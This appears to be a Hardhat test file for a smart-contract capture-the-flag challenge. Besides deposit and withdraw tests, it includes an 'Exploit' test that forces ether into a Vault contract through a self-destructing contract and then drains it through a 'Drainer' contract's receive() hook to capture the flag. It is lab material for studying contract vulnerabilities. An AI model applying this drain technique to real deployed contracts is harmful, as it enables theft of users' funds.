const { expect } = require("chai");

describe("Vault contract", function () {
  let vault;
  let deployer;
  beforeEach(async function () {
    const Vault = await ethers.getContractFactory("Vault");
    vault = await Vault.deploy({ value: ethers.utils.parseEther("1") });
  });

  it("Deposit", async function () {
    [deployer, depositor] = await ethers.getSigners();

    const flagHolder = await vault.flagHolder();
    expect(flagHolder).to.equal("0x0000000000000000000000000000000000000000");

    const tx = await vault.connect(depositor).deposit(
      ethers.utils.parseEther("1"),
      depositor.address,
      { value: ethers.utils.parseEther("1") }
    );
    await tx.wait();
    expect(await vault.balanceOf(depositor.address)).to.equal(ethers.utils.parseEther("1"));

    await expect(
      vault.connect(depositor).captureTheFlag(depositor.address)
    ).to.be.revertedWith("Balance is not 0");
  });

  it("Withdraw", async function () {
    [deployer, depositor] = await ethers.getSigners();

    const flagHolder = await vault.flagHolder();
    expect(flagHolder).to.equal("0x0000000000000000000000000000000000000000");

    let tx = await vault.connect(depositor).deposit(
      ethers.utils.parseEther("1"),
      depositor.address,
      { value: ethers.utils.parseEther("1") }
    );
    await tx.wait();
    expect(await vault.balanceOf(depositor.address)).to.equal(ethers.utils.parseEther("1"));

    tx = await vault.connect(depositor).withdraw(
      ethers.utils.parseEther("1"),
      depositor.address,
      depositor.address,
    );

    await tx.wait();
    expect(await vault.balanceOf(depositor.address)).to.equal(ethers.utils.parseEther("0"));

    await expect(
      vault.connect(depositor).captureTheFlag(depositor.address)
    ).to.be.revertedWith("Balance is not 0");
  });

  it("Exploit", async function () {
    [deployer, depositor] = await ethers.getSigners();

    const flagHolder = await vault.flagHolder();
    expect(flagHolder).to.equal("0x0000000000000000000000000000000000000000");
    //Double check that everything is set right

    //Deploy selfdestructing contract, with `vault` as input to
    const MaliciousContract = await ethers.getContractFactory("SelfDestructor");
    let maliciousContract = await MaliciousContract.deploy(vault.address);

    //Deploy the drainer contract
    const DrainerContract = await ethers.getContractFactory("Drainer");
    let drainerContract = await DrainerContract.deploy(vault.address);

    //Forces Eth to be sent to contract by selfdestructing the contract
    const txSelfDestruct = await maliciousContract.connect(depositor).implode({
      value: ethers.utils.parseEther("1")
    });
    await txSelfDestruct.wait();

    //Deposit 2 eth using the drainer contract
    const txDeposit = await drainerContract.connect(depositor).callDeposit({
        value: ethers.utils.parseEther("2")
    });
    await txDeposit.wait();

    //Call withdraw from drainer contract to trigger code in recieve()
    const txWithdraw = await drainerContract.callWithdraw();
    await txWithdraw.wait();

    const txGetFlag = await vault.connect(depositor).captureTheFlag(depositor.address);
    await txGetFlag.wait();

    const txGetFlagOwner = await vault.connect(depositor).flagHolder();
    await expect(await txGetFlagOwner).to.equal(depositor.address);
  });
});
